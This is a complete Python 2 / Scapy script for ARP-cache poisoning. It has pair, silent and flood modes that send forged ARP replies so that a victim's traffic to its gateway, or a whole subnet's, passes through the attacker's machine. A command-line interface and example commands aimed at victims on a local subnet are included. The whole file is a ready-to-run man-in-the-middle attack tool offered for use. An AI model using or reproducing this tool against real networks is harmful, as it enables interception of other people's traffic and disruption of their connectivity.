#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
arp.py – ARP-cache poisoning tool (Python-2.7 + Scapy 2.4.x)

Modes
-----
pair   : periodic poisoning of one or more <victim, gateway> pairs (default)
silent : reply only to ARP who-has packets (stealthy)
flood  : broadcast forged replies for every IP inside a CIDR

Run “sudo python2 arp.py -h” for full CLI help and example commands.
"""


import logging, signal, threading, time
try:
    import ipaddress    
except ImportError:
    raise SystemExit(
        "Install the ipaddress back-port first:  sudo pip2 install ipaddress")
from textwrap import dedent

from scapy.all import (
    ARP, Ether,
    get_if_hwaddr, getmacbyip,
    sendp, sniff,
)

logging.basicConfig(format='[%(levelname).1s] %(message)s', level=logging.INFO)
log = logging.getLogger('arp')


def _u(s):
    try:
        return unicode(s) 
    except NameError:
        return s

def craft(is_at_mac, dst_ip, dst_mac, src_ip):
    return (
        Ether(src=is_at_mac, dst=dst_mac) /
        ARP(op=2, psrc=src_ip, hwsrc=is_at_mac, pdst=dst_ip, hwdst=dst_mac)
    )

def resolve_mac(ip):
    mac = getmacbyip(ip)
    if not mac:
        raise RuntimeError("Could not resolve MAC for %s – host down?" % ip)
    return mac

class ActivePairSpoofer(threading.Thread):
    """Periodic two-way poisoning of one <victim, gateway> pair."""
    def __init__(self, iface, victim, gateway, att_mac, interval=10.0):
        threading.Thread.__init__(self)
        self.daemon = True   
        self.iface, self.victim, self.gateway = iface, victim, gateway
        self.att_mac, self.sleep, self._run = att_mac, interval, True

    def _spoof_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        # I am GW → victim
        sendp(craft(self.att_mac, v_ip, v_mac, g_ip),
              iface=self.iface, verbose=False)
        # I am victim → GW
        sendp(craft(self.att_mac, g_ip, g_mac, v_ip),
              iface=self.iface, verbose=False)

    def _restore_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        for _ in range(5):
            sendp(craft(g_mac, v_ip, v_mac, g_ip), iface=self.iface, verbose=0)
            sendp(craft(v_mac, g_ip, g_mac, v_ip), iface=self.iface, verbose=0)
            time.sleep(0.2)

    def run(self):
        log.info("[pair %s ↔ %s] active poisoning started",
                 self.victim[0], self.gateway[0])
        while self._run:
            self._spoof_once()
            time.sleep(self.sleep)
        self._restore_once()

    def stop(self): self._run = False


class FloodSpoofer(threading.Thread):
    """Broadcast forged replies for *every* IP in a CIDR."""
    def __init__(self, iface, cidr, gw_ip, att_mac, interval=10.0):
        threading.Thread.__init__(self)
        self.daemon = True   
        self.iface = iface
        self.cidr  = ipaddress.ip_network(_u(cidr), strict=False)
        self.gw_ip, self.att_mac, self.sleep, self._run = gw_ip, att_mac, interval, True

    def _spoof_once(self):
        for ip in self.cidr.hosts():
            sendp(craft(self.att_mac, str(ip), "ff:ff:ff:ff:ff:ff", self.gw_ip),
                  iface=self.iface, verbose=False)

    def run(self):
        log.info("[flood %s] poisoning whole subnet …", self.cidr)
        while self._run:
            self._spoof_once()
            time.sleep(self.sleep)
    def stop(self): self._run = False


class SilentResponder(threading.Thread):
    """Only answers ARP who-has for victim / gateway."""
    def __init__(self, iface, victim, gateway, att_mac):
        threading.Thread.__init__(self)
        self.daemon = True   
        self.iface, self.victim, self.gateway, self.att_mac = iface, victim, gateway, att_mac
        self._run = True

    def _handle(self, p):
        if not p.haslayer(ARP) or p[ARP].op != 1:  # who-has only
            return
        dst_ip, src_ip = p[ARP].pdst, p[ARP].psrc
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        if src_ip == v_ip and dst_ip == g_ip:      # victim → gw
            sendp(craft(self.att_mac, v_ip, v_mac, g_ip),
                  iface=self.iface, verbose=0)
        elif src_ip == g_ip and dst_ip == v_ip:    # gw → victim
            sendp(craft(self.att_mac, g_ip, g_mac, v_ip),
                  iface=self.iface, verbose=0)

    def run(self):
        log.info("[pair %s ↔ %s] silent responder active",
                 self.victim[0], self.gateway[0])
        sniff(iface=self.iface, filter="arp", prn=self._handle, store=0,
              stop_filter=lambda *_: not self._run)
    def stop(self): self._run = False


class PoisonManager(object):
    def __init__(self): self.thr = []
    def add(self, t): self.thr.append(t); t.start()
    def stop_all(self, *_):
        log.info("Stopping … restoring caches where applicable.")
        for t in self.thr:
            if hasattr(t, "stop"): t.stop()
        for t in self.thr: t.join()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        prog="arp.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="ARP-cache poisoning tool (pair / silent / flood)",
        epilog=dedent("""\
          Examples
          --------
          # Active pair (two victims) refresh every 4 s
          sudo python2 arp.py -i enp0s10 --victims 10.0.123.4,10.0.123.7 \\
               --gateway 10.0.123.1 --interval 4

          # Silent, on-demand poisoning
          sudo python2 arp.py -i enp0s10 --mode silent \\
               --victims 10.0.123.4 --gateway 10.0.123.1

          # Flood entire /24 every 8 s
          sudo python2 arp.py -i enp0s10 --mode flood \\
               --cidr 10.0.123.0/24 --gateway 10.0.123.1 --interval 8
        """))

    parser.add_argument("-i", "--iface", required=True,
                        help="Interface to inject frames (e.g. enp0s10)")
    parser.add_argument("--mode", choices=["pair", "silent", "flood"],
                        default="pair")
    parser.add_argument("--victims",
                        help="Comma-separated victim IP list (pair/silent)")
    parser.add_argument("--gateway",
                        help="Gateway IP (pair/silent/flood)")
    parser.add_argument("--cidr",
                        help="CIDR to poison in flood mode (e.g. 10.0.0.0/24)")
    parser.add_argument("--interval", type=float, default=10.0,
                        help="Seconds between bursts (pair/flood). Default 10")
    args = parser.parse_args()

    attacker_mac = get_if_hwaddr(args.iface)
    mgr = PoisonManager()

    try:
        if args.mode in ("pair", "silent"):
            if not (args.victims and args.gateway):
                parser.error("--victims and --gateway required")
            gw_ip, gw_mac = args.gateway, resolve_mac(args.gateway)
            for vip in [ip.strip() for ip in args.victims.split(",")]:
                vmac = resolve_mac(vip)
                thr = ActivePairSpoofer(args.iface, (vip, vmac),
                        (gw_ip, gw_mac), attacker_mac, args.interval) \
                      if args.mode == "pair" else \
                      SilentResponder(args.iface, (vip, vmac),
                        (gw_ip, gw_mac), attacker_mac)
                mgr.add(thr)

        elif args.mode == "flood":
            if not (args.cidr and args.gateway):
                parser.error("--cidr and --gateway required for flood mode")
            mgr.add(FloodSpoofer(args.iface, args.cidr, args.gateway,
                                 attacker_mac, args.interval))

        signal.signal(signal.SIGINT, mgr.stop_all)
        for t in mgr.thr: t.join()

    except Exception as e:
        log.error(str(e)); mgr.stop_all()
